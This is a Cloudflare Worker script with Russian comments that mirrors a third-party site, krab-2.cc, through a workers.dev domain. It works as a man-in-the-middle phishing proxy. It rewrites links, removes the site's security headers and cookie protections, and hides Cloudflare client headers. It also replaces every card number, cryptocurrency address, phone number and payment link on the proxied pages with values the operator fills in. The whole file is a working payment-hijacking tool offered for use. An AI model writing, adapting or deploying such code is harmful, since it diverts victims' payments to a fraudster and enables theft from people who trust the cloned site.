"use strict";

// ================================================================
// CONFIGURATION — slon6 (SIMPLIFIED - NO KV, NO TELEGRAM, NO CHAT)
// ================================================================

const PROXY_CONFIG = {
  originUrl:   "https://krab-2.cc",
  originHost:  "krab-2.cc",
  workerHost:  "autumn-lab-3570.justkeymap.workers.dev",       // <-- ваш workers.dev домен (без слэша в конце)
};

const REPLACEMENT_CONFIG = {
  // Карты / реквизиты (подставляются вместо любых 16-значных номеров)
  cardNumber:    "22813371051000",          // <-- ваш номер карты

  // Крипто-адреса (USDT TRC-20, BTC, ETH)
  cryptoAddress: "huitebelox",           // <-- ваш крипто-адрес

  // Телефоны — все найденные +7 / 8 номера заменяются на этот
  phoneNumber:   "+7 (880) 555-35-35",            // <-- ваш номер телефона

  // Внешние платёжные ссылки (fasttruetransfer.pro и т.п.)
  paymentLinkUrl:  "https://t.me/alone_visionaries",   // <-- ваша ссылка для оплаты
  paymentLinkText: "Пройдите на хуй ", // текст кнопки

  // Текстовые замены  { from: "...", to: "..." }
  textReplacements: [
    // Пример: убрать упоминания телеграм-ботов оригинала
    // { from: "@Krnmr145_bot",   to: "@YOUR_BOT" },
    // { from: "openkrab.to",     to: "yoursite.com" },
  ],
};

// ================================================================
// CONSTANTS
// ================================================================

const AUTH_PATH_RE        = /^\/(entry|register|captcha|login|logout|auth|signup)/i;
const BINARY_PATH_RE      = /^\/(random\/ava\/|storage\/image[s]?\/|img\/|images?\/|uploads?\/|avatars?\/|static\/|assets\/)/i;
const BINARY_EXTENSION_RE = /\.(png|jpe?g|gif|webp|ico|svg|woff2?|ttf|eot|otf|mp4|webm|ogg|mp3|pdf|zip|wasm)(\?.*)?$/i;
const BINARY_MIME_RE      = /^(image\/|audio\/|video\/|font\/|application\/(octet-stream|pdf|zip|wasm))/i;

const STRIPPED_ORIGIN_RESPONSE_HEADERS = new Set([
  "content-security-policy",
  "content-security-policy-report-only",
  "x-frame-options",
  "content-encoding",
  "set-cookie",
]);

const STRIPPED_CF_REQUEST_HEADERS = [
  "cf-connecting-ip", "cf-ipcountry", "cf-ray",
  "cf-visitor", "cf-worker", "x-forwarded-for",
];

// ================================================================
// REGEX PATTERNS FOR PAYMENT REPLACEMENT
// ================================================================

const CARD_NUMBER_RE      = /\b(\d{4}[\s\u00A0\-]?\d{4}[\s\u00A0\-]?\d{4}[\s\u00A0\-]?\d{4})\b/g;
const CRYPTO_ADDRESS_RE   = /\b(T[A-Za-z0-9]{33}|bc1[a-zA-Z0-9]{39,59}|0x[a-fA-F0-9]{40}|[13][a-zA-Z0-9]{25,34})\b/g;
const PHONE_NUMBER_RE     = /(\+7|8)\s*[\(\-]?\s*\d{3}\s*[\)\-]?\s*\d{3}\s*[\-]?\s*\d{2}\s*[\-]?\s*\d{2}/g;
const PAYMENT_LINK_RE     = /https?:\/\/fasttruetransfer\.pro\/[^\s"'<>]+/g;

// ================================================================
// ENTRY POINT
// ================================================================

export default {
  async fetch(request, env) {
    try {
      return await handleRequest(request);
    } catch (error) {
      console.error("[Worker] Unhandled error:", error.message, error.stack);
      return new Response(`Worker error: ${error.message}`, { status: 500 });
    }
  },
};

// ================================================================
// MAIN REQUEST HANDLER
// ================================================================

async function handleRequest(request) {
  const url = new URL(request.url);
  const method = request.method;

  // Handle CORS preflight
  if (method === "OPTIONS") {
    return new Response(null, {
      status: 204,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type, Accept",
      },
    });
  }

  // Proxy all other requests
  return proxyRequest(request, url);
}

// ================================================================
// TRANSPARENT PROXY
// ================================================================

async function proxyRequest(request, url) {
  const isAuthPath   = AUTH_PATH_RE.test(url.pathname);
  const isBinaryPath = BINARY_PATH_RE.test(url.pathname) || BINARY_EXTENSION_RE.test(url.pathname);

  let requestBody = null;
  if (request.method !== "GET" && request.method !== "HEAD") {
    requestBody = await request.arrayBuffer();
  }

  const originResponse  = await fetchFromOrigin(request, url, requestBody);
  const responseHeaders = buildProxiedResponseHeaders(originResponse);

  // Handle redirects
  if (originResponse.status >= 300 && originResponse.status < 400) {
    return new Response(null, { status: originResponse.status, headers: responseHeaders });
  }

  const contentType = originResponse.headers.get("content-type") || "";

  // Binary content - pass through without modification
  if (isBinaryPath || BINARY_MIME_RE.test(contentType)) {
    if (contentType) responseHeaders.set("content-type", contentType);
    responseHeaders.set("access-control-allow-origin", "*");
    responseHeaders.set("cache-control", "public, max-age=86400");
    return new Response(originResponse.body, { status: originResponse.status, headers: responseHeaders });
  }

  // Text content - rewrite URLs and replace payment details
  let responseText = rewriteAllOriginUrls(await originResponse.text());

  if (!isAuthPath && (contentType.includes("html") || contentType.includes("json") || contentType.includes("javascript"))) {
    responseText = replacePaymentDetails(responseText);
  }

  responseHeaders.set("content-type", contentType || "text/html; charset=utf-8");
  responseHeaders.delete("content-length");

  return new Response(responseText, { status: originResponse.status, headers: responseHeaders });
}

// ================================================================
// FETCH FROM ORIGIN
// ================================================================

async function fetchFromOrigin(request, url, bodyOverride) {
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set("Host", PROXY_CONFIG.originHost);
  requestHeaders.set("Accept-Encoding", "identity");

  // Strip Cloudflare headers
  for (const headerName of STRIPPED_CF_REQUEST_HEADERS) {
    requestHeaders.delete(headerName);
  }

  // Fix Origin and Referer headers
  const originHeader  = requestHeaders.get("Origin")  || "";
  const refererHeader = requestHeaders.get("Referer") || "";

  if (originHeader.includes(PROXY_CONFIG.workerHost)) {
    requestHeaders.set("Origin", `https://${PROXY_CONFIG.originHost}`);
  }
  if (refererHeader.includes(PROXY_CONFIG.workerHost)) {
    requestHeaders.set("Referer",
      refererHeader.replace(PROXY_CONFIG.workerHost, PROXY_CONFIG.originHost));
  }

  const requestBody = bodyOverride !== undefined
    ? bodyOverride
    : (request.method !== "GET" && request.method !== "HEAD" ? request.body : null);

  return fetch(`${PROXY_CONFIG.originUrl}${url.pathname}${url.search}`, {
    method:   request.method,
    headers:  requestHeaders,
    body:     requestBody,
    redirect: "manual",
  });
}

// ================================================================
// HELPERS: Response headers
// ================================================================

function buildProxiedResponseHeaders(originResponse) {
  const headers = new Headers();

  for (const [name, value] of originResponse.headers) {
    if (!STRIPPED_ORIGIN_RESPONSE_HEADERS.has(name.toLowerCase())) {
      headers.set(name, value);
    }
  }

  for (const cookie of getSetCookieHeaders(originResponse.headers)) {
    headers.append("set-cookie", stripCookieSecurityAttributes(cookie));
  }

  if (originResponse.headers.has("location")) {
    headers.set("location",
      rewriteSingleOriginUrl(originResponse.headers.get("location")));
  }

  return headers;
}

function getSetCookieHeaders(headers) {
  if (typeof headers.getSetCookie === "function") return headers.getSetCookie();
  const value = headers.get("set-cookie");
  return value ? [value] : [];
}

function stripCookieSecurityAttributes(rawCookie) {
  return rawCookie
    .replace(/;\s*domain=[^;]*/gi, "")
    .replace(/;\s*secure\b/gi, "")
    .replace(/;\s*samesite=[^;]*/gi, "");
}

// ================================================================
// HELPERS: URL rewriting
// ================================================================

function rewriteSingleOriginUrl(urlString) {
  return urlString
    .replace(`https://${PROXY_CONFIG.originHost}`, `https://${PROXY_CONFIG.workerHost}`)
    .replace(`http://${PROXY_CONFIG.originHost}`,  `https://${PROXY_CONFIG.workerHost}`);
}

function rewriteAllOriginUrls(text) {
  return text
    .replaceAll(`https://${PROXY_CONFIG.originHost}`, `https://${PROXY_CONFIG.workerHost}`)
    .replaceAll(`http://${PROXY_CONFIG.originHost}`,  `https://${PROXY_CONFIG.workerHost}`)
    .replaceAll(PROXY_CONFIG.originHost, PROXY_CONFIG.workerHost);
}

// ================================================================
// HELPERS: Payment details replacement
// ================================================================

function replacePaymentDetails(html) {
  const dataUris     = [];
  const scriptBlocks = [];
  const styleBlocks  = [];
  const urlAttrs     = [];

  let result = html
    .replace(/data:[a-z+\/.\-]+;base64,[A-Za-z0-9+\/=\s]+/gi,
      (match) => { dataUris.push(match);     return `\x00DATA${dataUris.length - 1}\x00`; })
    .replace(/<script[\s\S]*?<\/script>/gi,
      (match) => { scriptBlocks.push(match); return `\x00SCRIPT${scriptBlocks.length - 1}\x00`; })
    .replace(/<style[\s\S]*?<\/style>/gi,
      (match) => { styleBlocks.push(match);  return `\x00STYLE${styleBlocks.length - 1}\x00`; })
    .replace(/((?:src|href|srcset|action|poster)\s*=\s*["'][^"']*["'])/gi,
      (match) => { urlAttrs.push(match);     return `\x00URL${urlAttrs.length - 1}\x00`; });

  // Замена 16-значных номеров карт
  if (REPLACEMENT_CONFIG.cardNumber && REPLACEMENT_CONFIG.cardNumber !== "XXXX XXXX XXXX XXXX") {
    result = result.replace(CARD_NUMBER_RE, REPLACEMENT_CONFIG.cardNumber);
  }

  // Замена крипто-адресов
  if (REPLACEMENT_CONFIG.cryptoAddress && REPLACEMENT_CONFIG.cryptoAddress !== "YOUR_CRYPTO_ADDRESS") {
    result = result.replace(CRYPTO_ADDRESS_RE, REPLACEMENT_CONFIG.cryptoAddress);
  }

  // Замена телефонных номеров
  if (REPLACEMENT_CONFIG.phoneNumber && REPLACEMENT_CONFIG.phoneNumber !== "+7 (XXX) XXX-XX-XX") {
    result = result.replace(PHONE_NUMBER_RE, REPLACEMENT_CONFIG.phoneNumber);
  }

  // Замена замаскированных номеров телефона (************)
  if (REPLACEMENT_CONFIG.phoneNumber && REPLACEMENT_CONFIG.phoneNumber !== "+7 (XXX) XXX-XX-XX") {
    result = result.replace(
      /(<p[^>]*class="right_attr_item"[^>]*>Номер телефона:\s*<strong>)\*{6,}(<\/strong>)/gi,
      "$1" + REPLACEMENT_CONFIG.phoneNumber + "$2"
    );
  }

  // Замена платёжных ссылок (fasttruetransfer.pro и т.п.)
  if (REPLACEMENT_CONFIG.paymentLinkUrl && REPLACEMENT_CONFIG.paymentLinkUrl !== "https://YOUR-PAYMENT-LINK") {
    result = result.replace(PAYMENT_LINK_RE, REPLACEMENT_CONFIG.paymentLinkUrl);
  }

  // Пользовательские текстовые замены
  for (const { from, to } of REPLACEMENT_CONFIG.textReplacements) {
    if (from && to) {
      result = result.replaceAll(from, to);
    }
  }

  return result
    .replace(/\x00URL(\d+)\x00/g,    (_, i) => urlAttrs[Number(i)])
    .replace(/\x00STYLE(\d+)\x00/g,  (_, i) => styleBlocks[Number(i)])
    .replace(/\x00SCRIPT(\d+)\x00/g, (_, i) => scriptBlocks[Number(i)])
    .replace(/\x00DATA(\d+)\x00/g,   (_, i) => dataUris[Number(i)]);
}
